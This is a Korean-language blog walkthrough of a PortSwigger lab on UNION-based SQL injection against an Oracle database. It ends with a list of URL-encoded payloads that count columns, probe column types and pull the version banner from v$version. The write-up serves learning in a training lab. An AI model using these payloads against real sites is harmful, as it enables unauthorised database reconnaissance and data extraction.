---
title: SQL injection attack, querying the database type and version on Oracle
categories: [Playground, Port Swigger Lab]
tags: [Wargame, Port Swigger Lab, Union SQLi]
image:
  path: /assets/post/2025/Playground/Port Swigger/thumb.jpg
  alt: Port Swigger Lab - SQL Injection
published: true
---

# Introduction

> 홈페이지에 존재하는 SQL 인젝션 취약점을 이용하여 플래그를 확인하는 문제입니다.<br>
> 상품 카테고리 필터에 해당 취약점이 존재하며, **UNION SQLi 공격을 통해 데이터베이스의 버전을 출력**하면 플래그 확인이 가능합니다.

---

## UNION SQL Injection Conditions
```sql
SELECT COLUMN_A, COLUMN_B FORM TABLE_A
UNION
SELECT COLUMN_C, COLUMN_D FORM TABLE_B
```

* 테이블 A와 테이블 B의 컬럼 개수가 동일해야 합니다.
* 테이블 A와 테이블 B의 컬럼 유형이 동일해야 합니다.

---

## How to Solve ?

### Step 1. 카테고리 클릭 시 HTTP Request Packet 분석
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FA4ScC%2FbtsKZyZmXNl%2F8588D42QPAiLJabPFCQVSK%2Fimg.png" width=1300>

- 메인 페이지에서 "Accessories" 카테고리를 클릭하면 상단 URL에 "/filter?catergory=Accessories" 자원이 요청된 것을 확인할 수 있습니다.
- 이후 다시 "Accessories" 카테고리를 클릭하고 패킷을 확인해 보겠습니다.

---

<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbbXs4F%2FbtsKZ7mIrfn%2Fk7QbguTDpwblkpX7xBBbQ1%2Fimg.png" width=1300>

<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FcEOQiM%2FbtsK1IMtY6G%2Ffh2MK2UFYjGpqppLKot220%2Fimg.png" width=1300>

카테고리(Accessories) 클릭 시 정상적인 요청의 경우에는 서버 측에서 HTTP/2 200 OK 응답을 반환하고,
요청 패킷 내 파라미터(category)의 값을 Accessories' 로 변조하여 전송한 경우에는 500 Internal Server Error를 반환합니다.

HTTP Status Code 500은 웹 애플리케이션 코드의 버그, 서버의 잘못된 구성, 데이터베이스 연결 문제 등으로 인해 발생하기 때문에, 데이터베이스에 카테고리가 악세서리인 데이터를 요청할 때 잘못된 문법(쿼리문)으로 인해 서버 측에서 오류가 발생했다고 추측할 수 있습니다.

여기서 공격자는 웹 애플리케이션과 데이터베이스 사이에서 사용되는 SQL 쿼리문의 구조를 유추하고 공격을 시도합니다.

```sql
SELECT _ FROM _ WHERE category = 'USER_INPUT';
```

---

### Step 2. SQL 쿼리문 구조 예측 후 공격 구문을 삽입하여 데이터 추출 시도
> **(IMAGE 1)** ORDER BY절을 이용하여 테이블의 컬럼 수 확인
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FdAKvGQ%2FbtsKZw8ilUI%2FoeofDIUYUxRVo1lorM65hk%2Fimg.png" width=1300>

<br>

> **(IMAGE 2)** 컬럼 개수 확인 후 UNION절을 이용하여 Injectable SQL Query 작성
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fb8RBdl%2FbtsKZKkRMRk%2FD0rUKrxgGaIVyXQfdZTkhk%2Fimg.png" width=1300>

<br>

> **(IMAGE 3, 4)** 테이블의 컬럼 데이터 유형 확인
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FcXURWP%2FbtsK0HOGTY1%2Fssy9lr9kNUVktG5enRFDXK%2Fimg.png" alt="[IMAGE 3] 테이블 > 컬럼 유형(TYPE) 확인">
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbCx8CY%2FbtsKZaYLDag%2F47ql4cPHJQwfnQJjtMXeC0%2Fimg.png" width=1300 alt="[IMAGE 4] 테이블 > 컬럼 유형(TYPE) 확인">

<br>

> **(IMAGE 5, 6)** 데이터베이스 버전정보 확인 (CORE 11.2.0.2.0 Production)
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbPoIhd%2FbtsK1mQxtwp%2FdTDYrU0YaxKXzgtGojVmm1%2Fimg.png" width=1300 style="align-center" caption="[IMAGE 5] 데이터베이스 버전 추출 쿼리 삽입">
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2Fyd5mB%2FbtsK0iuHWXX%2F9tSvEArCK0u7XmFjRaBtsK%2Fimg.png" width=1300>

<br>

### Payload
```

/filter?category=Accessories'%20ORDER%20BY%202--
/filter?category=Accessories'%20UNION%20SELECT%20null%2Cnull%20FROM%20DUAL--
/filter?category=Accessories'%20UNION%20SELECT%20123%2C456%20FROM%20DUAL--
/filter?category=Accessories'%20UNION%20SELECT%20%27123%27%2C%27456%27%20FROM%20DUAL--
/filter?category=Accessories'%20UNION%20SELECT%20banner%2C%27456%27%20FROM%20v$version--
```

---

<h2 style="text-align: center;" data-ke-size="size26"><b>END</b></h2>